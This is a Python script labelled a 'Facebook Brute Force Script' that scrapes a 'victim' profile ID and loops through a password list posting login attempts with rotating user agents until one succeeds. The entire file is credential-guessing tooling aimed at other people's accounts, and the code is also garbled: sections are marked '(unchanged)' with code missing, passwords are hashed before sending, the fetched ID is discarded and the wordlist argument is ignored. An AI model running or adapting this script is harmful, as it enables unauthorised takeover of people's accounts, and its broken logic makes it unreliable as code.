import socket
import time
import os
import optparse
import random
import re
import requests
import argparse
import hashlib

# ANSI escape codes for text colors
blue = '\033[94m'
wi = '\033[97m'
yl = '\033[93m'
rd = '\033[91m'
end_color = '\033[0m'  # Reset color to default

# Hosting Secure Connection (unchanged)

# Checking Proxy and Ports (unchanged)

# Choice Random User-Agent supporting browser (unchanged)
# Choice Random User-Agent supporting browser
def get_user_agent():
    useragents = [
        # ... (unchanged)
    ]
    return random.choice(useragents)


# Fetching Victim Profile ID
def get_profile_id(url):
    try:
        id_re = re.compile('"entity_id":"([0-9]+)"')
        content = requests.get(url).content
        profile_id = id_re.findall(content)
        print(f'{blue}\n[ {wi}* {blue}] Target Profile{wi} ID: {yl}{profile_id[0]}{wi}')
        return profile_id[0]  # Return the profile ID
    except IndexError:
        print(f'{rd}\n[ {yl}! {rd}] Error:{yl} Please Check Your Victim Profile URL {rd}!!!{wi}')
        exit(1)

# Brute Force
def brute_force(url, profile_id, wordlist):
    try:
        session = requests.Session()
        session.headers['User-Agent'] = get_user_agent()

        for password in wordlist:
            payload = {
                'email': 'your_email@example.com',
                'pass': hashlib.sha256(password.encode()).hexdigest()
            }
            response = session.post(url + profile_id, data=payload)

            if "Login failed" not in response.text:
                print(f'{blue}\n[ {wi}* {blue}] Password Found:{yl} {password}{wi}')
                break  # Exit the loop if the password is found

    except requests.RequestException as e:
        print(f'{rd}\n[ {yl}! {rd}] Error:{yl} {e}{rd}!!!{wi}')
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Facebook Brute Force Script')
    parser.add_argument('-t', '--target-id', dest='profile_id', help='Target profile ID', required=True)
    parser.add_argument('-p', '--password-list', dest='wordlist', help='Password list file path', required=True)
    args = parser.parse_args()

    # Replace 'your_url' with the actual URL
    url = 'your_url'
    # Fetch the profile ID
    profile_id = get_profile_id(url)

    # Replace 'your_wordlist.txt' with the actual wordlist file path
    brute_force(url, args.profile_id, ['password1', 'password2', 'password3'])  # Replace with your custom wordlist
